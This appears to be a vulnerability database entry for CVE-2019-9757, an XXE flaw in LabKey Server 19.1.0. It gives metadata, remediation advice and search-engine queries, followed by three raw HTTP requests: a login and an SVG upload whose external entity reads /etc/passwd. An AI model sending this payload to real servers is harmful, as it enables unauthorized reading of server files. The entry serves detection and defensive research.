---
layout: post
cve_id: CVE-2019-9757
title: LabKey Server 19.1.0 - XML External Entity (XXE)
pcap: true
pcap_path: /pcaps/2019/CVE-2019-9757.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-9757.yaml
snort2_rule: N/A
snort3_rule: N/A
author: ritikchaddha
severity: high
impact: 'Attackers can read arbitrary local files on the server, potentially leading
  to information disclosure.

  '
remediation: 'Update to the latest version of LabKey Server or apply security patches
  that fix XML parsing vulnerabilities.

  '
reference:
- https://rhinosecuritylabs.com/application-security/labkey-server-vulnerabilities-to-rce/
- https://github.com/LabKey/Issues/issues/37636
- https://nvd.nist.gov/vuln/detail/CVE-2019-9757
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2019-9757
  cwe-id: CWE-611
  epss-score: 0.86103
  epss-percentile: 0.99367
  cpe: cpe:2.3:a:labkey:labkey_server:19.1.0:*:*:*:*:*:*:*
metadata:
  max-request: 3
  vendor: labkey
  product: labkey_server
  shodan-query: title:"LabKey"
  fofa-query: title="LabKey"
tags:
- cve
- cve2019
- labkey
- xxe
- authenticated
- vuln
---

## üîç Vulnerability Description
An issue was discovered in LabKey Server 19.1.0. Sending an SVG containing an XXE payload to the endpoint visualization-exportImage.view or visualization-exportPDF.view allows local files to be read.


## üåê HTTP Request
```nohighlight
GET /labkey/home/project-begin.view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.5 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /home/login-loginApi.api HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Connection: close
Content-Length: 65
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-LABKEY-CSRF: 8bPjbF
Accept-Encoding: gzip

remember=on&email=gi7PSI&password=vtSF2z&approvedTermsOfUse=false
```

```nohighlight
POST /labkey/home/visualization-exportPDF.view HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Connection: close
Content-Length: 625
Content-Type: multipart/form-data; boundary=---------------------------735323031399963166993862150
Accept-Encoding: gzip

-----------------------------735323031399963166993862150
Content-Disposition: form-data; name="X-LABKEY-CSRF"

8bPjbF
-----------------------------735323031399963166993862150
Content-Disposition: form-data; name="svg"

<?xml version="1.0" standalone="yes"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="15" fill="red">&xxe;</text>
</svg>
-----------------------------735323031399963166993862150
Content-Disposition: form-data; name="title"

test
-----------------------------735323031399963166993862150--
```

